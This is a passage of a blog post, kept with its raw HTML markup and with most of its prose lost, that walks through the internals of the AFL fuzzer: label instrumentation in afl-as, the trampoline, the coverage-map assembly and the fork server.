Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((colon_pos = <span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; <span class="built_in">isdigit</span>(*(colon_pos - <span class="number">1</span>))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">1</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line"></span><br><span class="line">        instrument_next = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ins_lines)</span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) <span class="built_in">fclose</span>(inf);</span><br><span class="line">  <span class="built_in">fclose</span>(outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) <span class="built_in">WARNF</span>(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">OKF</span>(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             <span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> : </span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>afl-as  300  <code>AFL main payload</code></p><ul><li>ida graph <code>j</code>   <code>m</code></li><li>jump  <code>label</code> </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">, . , (^)</span><br><span class="line">    <span class="number">1.</span> ^main        - </span><br><span class="line">    <span class="number">2.</span> ^.L0         - GCC</span><br><span class="line">    <span class="number">3.</span> ^.LBB0_0     - clang</span><br><span class="line">    <span class="number">4.</span> ^\tjnz foo   - </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="number">1.</span> ^# BB#<span class="number">0</span>      - clang</span><br><span class="line">    <span class="number">2.</span> ^ # BB#<span class="number">0</span>     - clang</span><br><span class="line">    <span class="number">3.</span> ^.Ltmp0      - clang</span><br><span class="line">    <span class="number">4.</span> ^.LC0        - GCC</span><br><span class="line">    <span class="number">5.</span> ^.LBB0_0     - GCC</span><br><span class="line">    <span class="number">6.</span> ^\tjmp foo   - </span><br></pre></td></tr></table></figure><h2 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h2><p></p><ul><li> rsp </li><li> rdx, rcx, rax </li><li> rcx  afl-as </li><li> __afl_maybe_log</li><li> rdx, rcx, rax  rsp</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"><span class="comment">// fprtinf</span></span><br><span class="line"><span class="comment">// R(MAP_SIZE))ecx/rcx %08x</span></span><br><span class="line"><span class="comment">// MAP_SIZE64KR(x)(random() % (x)) R(MAP_SIZE))0~64K</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span>   </span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="main-payload"><a href="#main-payload" class="headerlink" title="main_payload"></a>main_payload</h2><p><code>main_payload</code></p><p>IDACFG</p><h3 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log"></a>__afl_maybe_log</h3><p>afl_maybe_log</p><ul><li>lahfload ah with flagseflagsah</li><li>seto %alOF()AL</li><li>__afl_maybe_log <ul><li> __afl_setup </li><li> __afl_store rdx </li></ul></li></ul><p><code>__afl_area_ptr</code> <code>afl_setup</code> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__afl_maybe_log:</span><br><span class="line"></span><br><span class="line">  lahf</span><br><span class="line">  seto  %al</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if SHM region is already mapped. */</span></span><br><span class="line"></span><br><span class="line">  movq  __afl_area_ptr(%rip), %rdx</span><br><span class="line">  testq %rdx, %rdx</span><br><span class="line">  je    __afl_setup</span><br><span class="line"></span><br><span class="line">__afl_store:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Calculate and store hit for the code location specified in rcx. */</span></span><br><span class="line">  xorq __afl_prev_loc(%rip), %rcx</span><br><span class="line">  xorq %rcx, __afl_prev_loc(%rip)</span><br><span class="line">  shrq $<span class="number">1</span>, __afl_prev_loc(%rip)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">incb</span> (%rdx, %rcx, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">__afl_return:</span><br><span class="line"></span><br><span class="line">  addb $<span class="number">127</span>, %al</span><br><span class="line">  sahf</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p><code>__afl_maybe_log</code>  __afl_setup  __afl_store rdx </p><p><code>__afl_store</code> </p><ul><li> cur_location  rcx  prev_loc</li><li> prev_loc  cur_loc </li><li> prev_loc </li><li> hit count</li></ul><p>Coverage measurements <a href="https://xidoo.top/2022/01/afl-white-book/">(1)</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p> eflags </p><h3 id="afl-setup"><a href="#afl-setup" class="headerlink" title="__afl_setup"></a>__afl_setup</h3><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">__afl_setup:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do not retry setup if we had previous failures. */</span></span><br><span class="line"></span><br><span class="line">  cmpb $<span class="number">0</span>, __afl_setup_failure(%rip)</span><br><span class="line">  jne __afl_return</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check out if we have a global pointer on file. */</span></span><br><span class="line"></span><br><span class="line">  movq  __afl_global_area_ptr@<span class="built_in">GOTPCREL</span>(%rip), %<span class="function">rdx</span></span><br><span class="line"><span class="function">  <span class="title">movq</span>  <span class="params">(%rdx)</span>, %rdx</span></span><br><span class="line"><span class="function">  <span class="comment">/* 0 */</span></span></span><br><span class="line"><span class="function">  testq %rdx, %rdx</span></span><br><span class="line"><span class="function">  je    __afl_setup_first</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq %rdx, __<span class="title">afl_area_ptr</span><span class="params">(%rip)</span></span></span><br><span class="line"><span class="function">  jmp  __afl_store</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/*  caller-save  fork server */</span></span></span><br><span class="line"><span class="function">__afl_setup_first:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  /* Save everything that is not yet saved and that may be touched by</span></span><br><span class="line"><span class="function">     getenv() and several other libcalls we<span class="string">&#x27;ll be relying on. */</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /*  */</span></span></span><br><span class="line"><span class="string"><span class="function">  leaq -352(%rsp), %rsp</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rax,   0(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rcx,   8(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rdi,  16(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rsi,  32(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r8,   40(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r9,   48(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r10,  56(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r11,  64(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm0,  96(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm1,  112(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm2,  128(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm3,  144(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm4,  160(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm5,  176(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm6,  192(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm7,  208(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm8,  224(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm9,  240(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm10, 256(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm11, 272(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm12, 288(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm13, 304(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm14, 320(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm15, 336(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;</span>ll keep the</span></span><br><span class="line"><span class="function">     original stack ptr in the callee-saved r12. */</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  pushq %r12</span></span><br><span class="line"><span class="function">  movq  %rsp, %r12</span></span><br><span class="line"><span class="function">  subq  $<span class="number">16</span>, %rsp</span></span><br><span class="line"><span class="function">  andq  $<span class="number">0xfffffffffffffff0</span>, %rsp</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  leaq .AFL_SHM_ENV(%rip), %rdi</span></span><br><span class="line"><span class="function">call getenv@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  testq %rax, %rax</span></span><br><span class="line"><span class="function">  je    __afl_setup_abort</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq  %rax, %rdi</span></span><br><span class="line"><span class="function">call atoi@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  xorq %rdx, %rdx   /* shmat flags    */</span></span><br><span class="line"><span class="function">  xorq %rsi, %rsi   /* requested addr */</span></span><br><span class="line"><span class="function">  movq %rax, %rdi   /* SHM ID: ID         */</span></span><br><span class="line"><span class="function">call shmat@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  cmpq $<span class="number">-1</span>, %rax</span></span><br><span class="line"><span class="function">  je   __afl_setup_abort</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  /* Store the address of the SHM region. */</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq %rax, %rdx</span></span><br><span class="line"><span class="function">  movq %rax, __afl_area_ptr(%rip)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx</span></span><br><span class="line"><span class="function">  movq %rax, (%rdx)</span></span><br><span class="line"><span class="function">  movq %rax, %rdx</span></span><br></pre></td></tr></table></figure><p> getenv(__AFL_SHM_ID) 0  __afl_setup_abort </p><ul><li> __afl_setup_failure </li><li> __AFL_SHM_ID </li><li></li><li> afl-fuzz  setup_shm()  shmget()  shm id  __AFL_SHM_ID </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__afl_setup_abort:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Record setup failure so that we don&#x27;t keep calling</span></span><br><span class="line"><span class="comment">     shmget() / shmat() over and over again. */</span></span><br><span class="line"></span><br><span class="line">  incb __afl_setup_failure(%rip)</span><br><span class="line"></span><br><span class="line">  movq %r12, %rsp</span><br><span class="line">  popq %r12</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">0</span>(%rsp), %rax</span><br><span class="line">  movq  <span class="number">8</span>(%rsp), %rcx</span><br><span class="line">  movq <span class="number">16</span>(%rsp), %rdi</span><br><span class="line">  movq <span class="number">32</span>(%rsp), %rsi</span><br><span class="line">  movq <span class="number">40</span>(%rsp), %r8</span><br><span class="line">  movq <span class="number">48</span>(%rsp), %r9</span><br><span class="line">  movq <span class="number">56</span>(%rsp), %r10</span><br><span class="line">  movq <span class="number">64</span>(%rsp), %r11</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">96</span>(%rsp), %xmm0</span><br><span class="line">  movq <span class="number">112</span>(%rsp), %xmm1</span><br><span class="line">  movq <span class="number">128</span>(%rsp), %xmm2</span><br><span class="line">  movq <span class="number">144</span>(%rsp), %xmm3</span><br><span class="line">  movq <span class="number">160</span>(%rsp), %xmm4</span><br><span class="line">  movq <span class="number">176</span>(%rsp), %xmm5</span><br><span class="line">  movq <span class="number">192</span>(%rsp), %xmm6</span><br><span class="line">  movq <span class="number">208</span>(%rsp), %xmm7</span><br><span class="line">  movq <span class="number">224</span>(%rsp), %xmm8</span><br><span class="line">  movq <span class="number">240</span>(%rsp), %xmm9</span><br><span class="line">  movq <span class="number">256</span>(%rsp), %xmm10</span><br><span class="line">  movq <span class="number">272</span>(%rsp), %xmm11</span><br><span class="line">  movq <span class="number">288</span>(%rsp), %xmm12</span><br><span class="line">  movq <span class="number">304</span>(%rsp), %xmm13</span><br><span class="line">  movq <span class="number">320</span>(%rsp), %xmm14</span><br><span class="line">  movq <span class="number">336</span>(%rsp), %xmm15</span><br><span class="line"></span><br><span class="line">  leaq <span class="number">352</span>(%rsp), %rsp</span><br><span class="line"></span><br><span class="line">  jmp __afl_return</span><br></pre></td></tr></table></figure><p> <code>shmat(shmid, 0, 0)</code>, __afl_area_ptr GOT  __afl_global_area_ptr </p><ul><li><code>__afl_area_ptr</code>  lcomm <code>__afl_global_area_ptr</code>  comm </li><li>lcomm  static  lcomm  comm  comm </li><li> AFL main payload __afl_area_ptr </li><li> __afl_global_area_ptr  __afl_global_area_ptr  shm </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.AFL_VARS:</span><br><span class="line"></span><br><span class="line">  .lcomm   __afl_area_ptr, <span class="number">8</span></span><br><span class="line">  .lcomm   __afl_prev_loc, <span class="number">8</span></span><br><span class="line">  .lcomm   __afl_fork_pid, <span class="number">4</span></span><br><span class="line">  .lcomm   __afl_temp, <span class="number">4</span></span><br><span class="line">  .lcomm   __afl_setup_failure, <span class="number">1</span></span><br><span class="line">  .comm    __afl_global_area_ptr, <span class="number">8</span>, <span class="number">8</span></span><br><span class="line"></span><br><span class="line">.AFL_SHM_ENV:</span><br><span class="line">  .asciz <span class="string">&quot;__AFL_SHM_ID&quot;</span></span><br></pre></td></tr></table></figure><p> <code>rdx</code>  fork server</p><h4 id="fork-server"><a href="#fork-server" class="headerlink" title="fork server"></a>fork server</h4><p>execve() fuzzer  execve() </p><p>AFL  fork server</p><p> fuzzer </p><p> fork AFL</p><ul><li> shm  esp  16  <code>write(FORKSRV_FD+1, __afl_temp, 4)</code><ul><li>config.h  FORKSRV_FD fork server  198199  fd </li><li>__afl_temp  bss  4 </li><li>pipepipeafl-fuzz</li></ul></li><li>write()  4 __afl_fork_resume  __afl_fork_wait_loop </li></ul><p><a href="https://rk700.github.io/2017/12/28/afl-internals/">afl-fuzzpipe</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// st_pipe: status pipe</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br></pre></td></tr></table></figure><p>forkserver</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__afl_forkserver:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Enter the fork server mode to avoid the overhead of execve() calls. We</span></span><br><span class="line"><span class="comment">     push rdx (area ptr) twice to keep stack alignment neat. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* %rdx  shm  */</span></span><br><span class="line">  pushq %rdx</span><br><span class="line">  pushq %rdx</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phone home and tell the parent that we&#x27;re OK. (Note that signals with</span></span><br><span class="line"><span class="comment">     no SA_RESTART will mess it up). If this fails, assume that the fd is</span></span><br><span class="line"><span class="comment">     closed because we were execve()d from an instrumented binary, or because</span></span><br><span class="line"><span class="comment">     the parent doesn&#x27;t want to use the fork server. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// st_pipeforkserverfuzzer</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $<span class="string">&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;</span>, %rdi       <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"></span><br><span class="line">  cmpq $<span class="number">4</span>, %rax</span><br><span class="line">  jne  __afl_fork_resume</span><br><span class="line"></span><br><span class="line">__afl_fork_wait_loop:</span><br></pre></td></tr></table></figure><p> <code>__afl_fork_wait_loop</code></p><ul><li>read<code>ctl_pipe</code><code>__afl_die</code></li><li>fork</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__afl_fork_wait_loop:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for parent by reading from the pipe. Abort if read fails. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// read ctl_pipe fuzzer</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $<span class="string">&quot; STRINGIFY(FORKSRV_FD) &quot;</span>, %rdi             <span class="comment">/* file desc */</span></span><br><span class="line">call read@PLT</span><br><span class="line">  cmpq $<span class="number">4</span>, %rax</span><br><span class="line">  jne  __afl_die</span><br><span class="line">call fork@PLT</span><br><span class="line">  cmpq $<span 